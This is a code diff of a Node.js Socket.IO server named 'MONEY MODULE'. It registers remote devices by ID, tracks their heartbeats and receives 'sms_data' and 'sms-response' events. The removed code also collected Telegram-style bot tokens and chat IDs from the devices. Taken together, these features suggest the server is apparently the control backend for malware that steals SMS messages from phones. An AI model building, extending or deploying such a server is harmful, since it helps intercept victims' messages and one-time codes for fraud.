@@ -6,7 +6,6 @@
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
-const crypto = require('crypto');
 
 const app = express();
 const server = http.createServer(app);
@@ -33,130 +32,63 @@ app.get('/', (req, res) => {
   });
 });
 
-// API endpoint to check device
-app.get('/api/device/:deviceId', (req, res) => {
-  const { deviceId } = req.params;
-  const device = registeredDevices.get(deviceId);
-  
-  if (device) {
-    res.json({
-      success: true,
-      device: device
-    });
-  } else {
-    res.json({
-      success: false,
-      message: 'Device not found'
-    });
-  }
-});
-
 // Socket.IO connection handling
 io.on('connection', (socket) => {
   console.log(`[CONNECT] New connection: ${socket.id}`);
   
   // Get device info from auth
   const deviceId = socket.handshake.auth?.deviceId || 'unknown';
-  const botToken = socket.handshake.auth?.botToken || '';
-  const chatId = socket.handshake.auth?.chatId || '';
+  
+  console.log(`[AUTH] Device ID: ${deviceId}`);
   
   // Store connection
   connectedDevices.set(socket.id, {
     deviceId,
-    botToken,
-    chatId,
+    socketId: socket.id,
     connectedAt: new Date().toISOString()
   });
   
-  console.log(`[DEVICE] Device connected: ${deviceId}`);
+  // AUTO-REGISTER from auth
+  if (deviceId && deviceId !== 'unknown') {
+    registeredDevices.set(deviceId, {
+      deviceId: deviceId,
+      socketId: socket.id,
+      registeredAt: new Date().toISOString(),
+      lastSeen: new Date().toISOString()
+    });
+    console.log(`[REGISTERED] Device: ${deviceId}`);
+  }
   
-  // Send connection confirmation
+  // Send confirmation
   socket.emit('connected', {
     message: 'Connected to server',
     deviceId: deviceId,
     socketId: socket.id
   });
   
-  // Handle device registration
-  socket.on('register', (data) => {
-    console.log(`[REGISTER] Device registration: ${JSON.stringify(data)}`);
-    
-    const regDeviceId = data.deviceId || deviceId;
-    
-    registeredDevices.set(regDeviceId, {
-      deviceId: regDeviceId,
-      botToken: data.botToken || botToken,
-      chatId: data.chatId || chatId,
-      registeredAt: new Date().toISOString(),
-      lastSeen: new Date().toISOString()
-    });
-    
-    socket.emit('registered', {
-      success: true,
-      message: 'Device registered successfully',
-      deviceId: regDeviceId
-    });
-  });
-  
-  // Handle SMS data
-  socket.on('sms_data', (data) => {
-    console.log(`[SMS] Received SMS data from ${deviceId}`);
-    
-    // Update last seen
+  // Handle heartbeat
+  socket.on('heartbeat', (data) => {
     if (registeredDevices.has(deviceId)) {
       const device = registeredDevices.get(deviceId);
       device.lastSeen = new Date().toISOString();
       registeredDevices.set(deviceId, device);
     }
-    
-    // Acknowledge receipt
-    socket.emit('sms_received', {
-      success: true,
-      message: 'SMS data received'
-    });
+    socket.emit('heartbeat', { timestamp: Date.now() });
   });
   
-  // Handle heartbeat
-  socket.on('heartbeat', () => {
-    socket.emit('heartbeat_ack', {
-      timestamp: Date.now()
-    });
-  });
-  
-  // Handle ping
-  socket.on('ping', () => {
-    socket.emit('pong', {
-      timestamp: Date.now()
-    });
+  // Handle SMS response
+  socket.on('sms-response', (data) => {
+    console.log(`[SMS-RESPONSE] From ${deviceId}`);
   });
   
   // Handle disconnect
   socket.on('disconnect', (reason) => {
-    console.log(`[DISCONNECT] ${socket.id} disconnected: ${reason}`);
+    console.log(`[DISCONNECT] ${deviceId}: ${reason}`);
     connectedDevices.delete(socket.id);
   });
-  
-  // Handle errors
-  socket.on('error', (error) => {
-    console.error(`[ERROR] Socket error: ${error}`);
-  });
 });
 
-// Start server
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-  console.log('========================================');
-  console.log('🚀 MONEY MODULE Server Started');
-  console.log(`📡 Port: ${PORT}`);
-  console.log(`🌐 URL: http://localhost:${PORT}`);
-  console.log('========================================');
-});
-
-// Graceful shutdown
-process.on('SIGTERM', () => {
-  console.log('SIGTERM received, shutting down...');
-  server.close(() => {
-    console.log('Server closed');
-    process.exit(0);
-  });
+  console.log('MONEY MODULE Server Started on port ' + PORT);
 });
